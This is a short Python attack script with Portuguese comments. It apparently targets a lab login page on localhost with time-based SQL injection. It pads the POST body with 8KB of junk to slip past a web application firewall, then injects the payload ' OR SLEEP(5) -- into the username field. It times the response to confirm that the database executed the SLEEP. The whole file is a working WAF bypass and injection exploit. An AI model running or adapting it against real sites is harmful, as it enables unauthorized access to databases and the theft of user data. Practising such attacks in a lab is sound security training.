import urllib.request
import urllib.parse
import time

# Configuração
url = "http://localhost/sqli-login.php"

# 1. Gerar 8KB de lixo (O Bypass do WAF)
lixo = "A" * 8192

# 2. Payload Time-Based
# Usamos 'OR' para obrigar o MySQL a executar o SLEEP mesmo se o usuario nao existir.
# O '-- ' (com espaco) comenta o resto da query original.
payload_ataque = "' OR SLEEP(5) -- "

# 3. Construir os dados
dados_form = [
    ('lixo', lixo),
    ('usuario', payload_ataque),
    ('senha', 'qualquercoisa') 
]

dados_codificados = urllib.parse.urlencode(dados_form).encode('utf-8')

print(f"[+] Enviando requisicao com bypass de 8KB...")
print(f"[+] Payload: {payload_ataque}")
print("[+] Aguardando resposta (deve demorar ~5 segundos)...")

# Medir o tempo
inicio = time.time()

try:
    req = urllib.request.Request(url, data=dados_codificados, method='POST')
    
    with urllib.request.urlopen(req) as response:
        html = response.read().decode('utf-8')
        
    fim = time.time()
    duracao = fim - inicio
    
    print(f"\n[RESULTADO] Tempo total da requisicao: {duracao:.4f} segundos")
    
    if duracao >= 5:
        print("[VITORIA] SUCESSO! O banco de dados 'dormiu'.")
        print("Isso prova que voce tem execucao remota de comandos SQL.")
    else:
        print("[FALHA] A resposta foi rapida demais. O SLEEP nao executou.")

except Exception as e:
    print(f"\n[ERRO] {e}")
